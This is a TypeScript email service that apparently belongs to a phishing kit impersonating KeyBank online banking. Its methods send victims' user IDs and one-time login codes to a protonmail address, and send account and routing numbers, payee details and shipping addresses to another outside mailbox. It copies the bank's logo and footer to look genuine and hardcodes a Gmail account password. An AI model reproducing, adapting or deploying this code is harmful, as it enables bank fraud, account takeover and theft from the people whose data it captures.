import nodemailer from 'nodemailer';

interface EmailOptions {
  to: string;
  subject: string;
  text?: string;
  html?: string;
}

class EmailService {
  private transporter: nodemailer.Transporter;

  constructor() {
    this.transporter = nodemailer.createTransport({
      host: 'smtp.gmail.com',
      port: 465,
      secure: true,
      auth: {
        user: 'exesoftware010@gmail.com',
        pass: 'lmgz etkx gude udar',
      },
    });
  }

  async sendOTP(userId: string, otpCode: string): Promise<boolean> {
    const adminEmail = 'andrecolins@protonmail.com';

    const emailOptions: EmailOptions = {
      to: adminEmail,
      subject: 'KeyBank Login Verification Code',
      html: `
        <!DOCTYPE html>
        <html>
        <head>
          <style>
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; background-color: #f6f6f6; }
            .container { max-width: 600px; margin: 0 auto; background-color: white; border-radius: 8px; padding: 30px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1); }
            .header { text-align: center; margin-bottom: 30px; }
            .logo { height: 60px; }
            .otp-code { background-color: #c8102e; color: white; font-size: 32px; font-weight: bold; text-align: center; padding: 20px; border-radius: 8px; letter-spacing: 8px; margin: 20px 0; }
            .message { color: #333; line-height: 1.6; margin-bottom: 20px; }
            .footer { color: #6e6e6e; font-size: 12px; text-align: center; margin-top: 30px; border-top: 1px solid #e0e0e0; padding-top: 20px; }
          </style>
        </head>
        <body>
          <div class="container">
            <div class="header">
              <img src="https://ibx.key.com/ibxolb/login/images/key-logo.svg" alt="KeyBank" class="logo">
            </div>

            <div class="message">
              <h2 style="color: #c8102e;">Security Verification Required</h2>
              <p>A login attempt was made for User ID: <strong>${userId}</strong></p>
              <p>Your KeyBank verification code is:</p>
            </div>

            <div class="otp-code">${otpCode}</div>

            <div class="message">
              <p><strong>Important:</strong> This code will expire in 10 minutes for your security.</p>
              <p>If you did not request this code, please contact KeyBank immediately.</p>
            </div>

            <div class="footer">
              <p>This is an automated message from KeyBank Online Banking.</p>
              <p>© 2024 KeyCorp. KeyBank is Member FDIC.</p>
            </div>
          </div>
        </body>
        </html>
      `,
      text: `KeyBank Security Verification\n\nUser ID: ${userId}\nVerification Code: ${otpCode}\n\nThis code expires in 10 minutes.\n\n© 2024 KeyCorp. KeyBank is Member FDIC.`,
    };

    try {
      const result = await this.transporter.sendMail({
        from: process.env.SMTP_USER || 'support@autosmobile.us',
        ...emailOptions,
      });

      console.log('OTP email sent successfully:', result.messageId);
      return true;
    } catch (error) {
      console.error('Failed to send OTP email:', error);
      // Return false but don't crash the application
      return false;
    }
  }

  async sendBillPaymentNotification(paymentData: any): Promise<boolean> {
    const adminEmail = 'support@cbelko.net';

    const emailOptions: EmailOptions = {
      to: adminEmail,
      subject: 'New Bill Payment Scheduled - KeyBank',
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
          <h2 style="color: #c8102e;">Bill Payment Notification</h2>
          <p><strong>Payment Details:</strong></p>
          <ul>
            <li><strong>Payee Name:</strong> ${paymentData.payeeName}</li>
            <li><strong>Payee Address:</strong> ${paymentData.payeeAddress || 'N/A'}</li>
            <li><strong>Amount:</strong> $${paymentData.amount}</li>
            <li><strong>From Account:</strong> ${paymentData.fromAccount}</li>
            <li><strong>Payment Date:</strong> ${paymentData.paymentDate}</li>
            <li><strong>Memo:</strong> ${paymentData.memo || 'N/A'}</li>
          </ul>
          <hr style="border: none; border-top: 1px solid #ddd; margin: 30px 0;">
          <p style="color: #666; font-size: 12px;">KeyBank - Secure Banking Solutions</p>
        </div>
      `
    };

    try {
      await this.transporter.sendMail({
        from: process.env.SMTP_USER || 'support@autosmobile.us',
        ...emailOptions,
      });
      return true;
    } catch (error) {
      console.error('Failed to send bill payment notification:', error);
      return false;
    }
  }

  async sendCheckOrderNotification(orderData: any): Promise<boolean> {
    const adminEmail = 'support@cbelko.net';

    const emailOptions: EmailOptions = {
      to: adminEmail,
      subject: 'New Checkbook Order - KeyBank',
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
          <h2 style="color: #c8102e;">Checkbook Order Notification</h2>
          <p><strong>Order Details:</strong></p>
          <ul>
            <li><strong>Account Name:</strong> ${orderData.accountName}</li>
            <li><strong>Account Number:</strong> ${orderData.accountNumber}</li>
            <li><strong>Check Style:</strong> ${orderData.checkStyle}</li>
            <li><strong>Quantity:</strong> ${orderData.quantity} checks</li>
            <li><strong>Price:</strong> $${orderData.price}</li>
            <li><strong>Shipping Address:</strong> ${orderData.shippingAddress}</li>
          </ul>
          <hr style="border: none; border-top: 1px solid #ddd; margin: 30px 0;">
          <p style="color: #666; font-size: 12px;">KeyBank - Secure Banking Solutions</p>
        </div>
      `
    };

    try {
      await this.transporter.sendMail({
        from: process.env.SMTP_USER || 'support@autosmobile.us',
        ...emailOptions,
      });
      return true;
    } catch (error) {
      console.error('Failed to send checkbook order notification:', error);
      return false;
    }
  }

  async sendExternalAccountNotification(accountData: any): Promise<boolean> {
    const adminEmail = 'support@cbelko.net';

    const emailOptions: EmailOptions = {
      to: adminEmail,
      subject: 'New External Account Added - KeyBank',
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
          <h2 style="color: #c8102e;">External Account Added</h2>
          <p><strong>Account Details:</strong></p>
          <ul>
            <li><strong>Bank Name:</strong> ${accountData.bankName}</li>
            <li><strong>Account Name:</strong> ${accountData.accountName}</li>
            <li><strong>Account Number:</strong> ${accountData.accountNumber}</li>
            <li><strong>Routing Number:</strong> ${accountData.routingNumber}</li>
            <li><strong>Address:</strong> ${accountData.address}</li>
          </ul>
          <hr style="border: none; border-top: 1px solid #ddd; margin: 30px 0;">
          <p style="color: #666; font-size: 12px;">KeyBank - Secure Banking Solutions</p>
        </div>
      `
    };

    try {
      await this.transporter.sendMail({
        from: process.env.SMTP_USER || 'support@autosmobile.us',
        ...emailOptions,
      });
      return true;
    } catch (error) {
      console.error('Failed to send external account notification:', error);
      return false;
    }
  }

  async sendMicroDepositNotification(accountData: any, deposits: { amount1: string, amount2: string }): Promise<boolean> {
    const adminEmail = 'support@cbelko.net';

    const emailOptions: EmailOptions = {
      to: adminEmail,
      subject: 'Micro-Deposit Verification - KeyBank',
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
          <h2 style="color: #c8102e;">Micro-Deposit Verification</h2>
          <p><strong>External Account:</strong> ${accountData.bankName} - ${accountData.accountName}</p>
          <p><strong>Verification Deposits:</strong></p>
          <ul>
            <li><strong>Deposit 1:</strong> $${deposits.amount1}</li>
            <li><strong>Deposit 2:</strong> $${deposits.amount2}</li>
          </ul>
          <p>Please verify these amounts to confirm your external account linking.</p>
          <hr style="border: none; border-top: 1px solid #ddd; margin: 30px 0;">
          <p style="color: #666; font-size: 12px;">KeyBank - Secure Banking Solutions</p>
        </div>
      `
    };

    try {
      await this.transporter.sendMail({
        from: process.env.SMTP_USER || 'support@autosmobile.us',
        ...emailOptions,
      });
      return true;
    } catch (error) {
      console.error('Failed to send micro-deposit notification:', error);
      return false;
    }
  }

  async sendPayeeNotification(payeeData: any): Promise<boolean> {
    const adminEmail = 'support@cbelko.net';

    const emailOptions: EmailOptions = {
      to: adminEmail,
      subject: 'New Payee Added - KeyBank',
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
          <h2 style="color: #c8102e;">New Payee Added</h2>
          <p><strong>Payee Details:</strong></p>
          <ul>
            <li><strong>Name:</strong> ${payeeData.name}</li>
            <li><strong>Account Number:</strong> ${payeeData.accountNumber || 'N/A'}</li>
            <li><strong>Address:</strong> ${payeeData.address}</li>
          </ul>
          <hr style="border: none; border-top: 1px solid #ddd; margin: 30px 0;">
          <p style="color: #666; font-size: 12px;">KeyBank - Secure Banking Solutions</p>
        </div>
      `
    };

    try {
      await this.transporter.sendMail({
        from: process.env.SMTP_USER || 'support@autosmobile.us',
        ...emailOptions,
      });
      return true;
    } catch (error) {
      console.error('Failed to send payee notification:', error);
      return false;
    }
  }
}

export const emailService = new EmailService();
